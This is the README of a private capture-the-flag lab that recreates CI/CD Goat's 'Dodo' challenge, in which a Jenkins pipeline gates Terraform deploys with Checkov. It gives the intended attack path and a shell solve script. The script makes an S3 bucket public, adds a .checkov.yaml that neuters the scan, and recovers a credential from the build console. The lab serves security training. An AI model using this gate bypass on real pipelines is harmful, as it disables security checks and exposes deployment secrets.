# Dodo: insufficient flow control (CyberCTF lab)

A bespoke, self-contained reproduction of the **Dodo** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-1,
Insufficient Flow Control Mechanisms**. Wonderland deploys infrastructure with CI: a **Jenkins**
controller scans and deploys the `Wonderland/dodo` repository (Terraform for an S3 bucket, hosted on
a **Gitea** server). A security scanner (**Checkov**) runs as a **deploy gate** and refuses a
publicly-readable bucket. But the scanner reads its configuration from the repository, so an attacker
with write access makes the bucket public **and** adds a `.checkov.yaml` that neuters the scan; the
gate then passes, the gated deploy runs the malicious change, and Wonderland's release token (a
**Global-scope** Jenkins credential the deploy step binds only when a public bucket is actually
deployed) lands in the build console. This is a **security-scan / gate bypass**.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a gated-deploy attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates the `wonderland-dodo` pipeline — **defined in Jenkins, not read from the repo** — which polls the dodo repo over git (about every minute), runs Checkov as a deploy gate, and (past the gate) deploys and prints the Global-scope `flag` credential only if a public bucket was deployed. Checkov 3.3.29 and `git`/`curl` are installed; builds run on the controller's own executor. |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the private `dodo` repo, the attacker `alice` (write) and the poller `jenkins` (read), then pushes the sample Terraform project. |

No GitLab, CTFd, LocalStack or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot — allow a few minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `dodo` | `SECRET` (`%s`) | Wonderland's release token, exfiltrated from the Jenkins credential store by bypassing the deploy gate |

Intended path: clone `Wonderland/dodo` with write creds → set the dodo bucket's `acl` to
`public-read` in `main.tf` → add a `.checkov.yaml` with `soft-fail: true` and `check: [MY_CHECK]`
(so Checkov passes the public bucket) → push to `main` → the pipeline scans (now a no-op), deploys
the public bucket, and prints the token → recover it from the console blob with `base64 -d | rev`.
The recovered token is the flag. (The pipeline is fixed in Jenkins, so the attacker never touches
what it runs — only what it scans; see UPSTREAM.md.)

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_DODO]`, delivered via
`files: [{ path: /run/lab/secrets/flag, input: CTF_FLAG_DODO }]` on the Jenkins machine), never an
environment variable, so it never appears in `docker inspect`, an image layer or a generated file.
The Jenkins entrypoint stages the file into the directory JCasC reads file secrets from, so the
`flag` credential (`secret: "${flag}"`) resolves at boot **into the credential store only** — the
deploy step must bind the credential to read it, and only prints it once a public bucket is deployed.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_DODO for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits for the build
isothrum down . --target docker
```

Solve it the way the check does:

```bash
git clone http://alice:alice@<gitea-url>/Wonderland/dodo.git
cd dodo
sed -i 's/"private"/"public-read"/' main.tf                 # make the bucket public
printf 'soft-fail: true\ncheck:\n  - MY_CHECK\n' > .checkov.yaml   # neuter the scan
git commit -am 'open the bucket' && git push origin main
# read the build console in Jenkins; the flag is `base64 -d | rev` of the printed blob
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins + Checkov (in a venv), runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the Global-scope `flag` credential, security, the Job DSL seed
- `build/jenkins/casc/jobdsl/dodo.groovy` — the fixed scan-and-deploy pipeline (git poll; attacker cannot edit it)
- `build/jenkins/deploy.sh` — the gated deploy step (`/usr/local/bin/dodo-deploy`): prints the token only when a public bucket was deployed
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the JCasC file-secret directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/dodo-solve`): performs the gate bypass end to end and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/users/repo and pushes the Terraform project
- `build/gitea/repo-src/` — the original `dodo` Terraform module (`main.tf`, `variables.tf`, `outputs.tf`)
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the faithful deviations (the deploy, the trigger, the encoding)
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
